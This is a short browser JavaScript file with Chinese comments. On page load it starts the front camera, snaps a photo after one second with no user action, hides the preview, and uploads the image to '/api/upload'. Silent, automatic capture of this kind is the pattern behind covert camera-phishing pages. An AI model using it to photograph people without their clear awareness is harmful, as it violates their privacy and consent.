let mediaStream = null;
const video = document.getElementById('video');
const capturedImage = document.getElementById('capturedImage');
const canvas = document.getElementById('canvas');
const context = canvas.getContext('2d');

// ✅ 页面加载后自动启动摄像头
async function startCamera() {
    try {
        mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        video.srcObject = mediaStream;

        // ✅ 监听视频流加载完成，自动拍照
        video.addEventListener("loadeddata", () => {
            console.log("视频已加载，1秒后自动拍照...");
            setTimeout(capturePhoto, 1000); // 延迟1秒，确保画面稳定
        });

    } catch (err) {
        alert("无法访问摄像头，请检查权限设置或更换浏览器！");
        console.error("摄像头启动失败:", err);
    }
}

function capturePhoto() {
    video.currentTime += 0.0001; // 强制刷新视频帧
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    requestAnimationFrame(() => {
        const dataUrl = canvas.toDataURL('image/png');
        capturedImage.src = dataUrl;
        // capturedImage.style.display = "block";

        stopCamera();
        uploadImage(dataURLtoBlob(dataUrl));
    });
}

function stopCamera() {
    if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
    }
    video.srcObject = null;
}

function uploadImage(blob) {
    const formData = new FormData();
    formData.append('image', blob, 'snapshot.png');

    fetch('/api/upload', { method: 'POST', body: formData })
        .then(response => response.json())
        .then(result => console.log('图片上传成功:', result))
        .catch(error => console.error('图片上传失败:', error));
}

function dataURLtoBlob(dataurl) {
    let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
    while (n--) {
        u8arr[n] = bstr.charCodeAt(n);
    }
    return new Blob([u8arr], { type: mime });
}

// ✅ 页面加载时自动启动摄像头
window.onload = startCamera;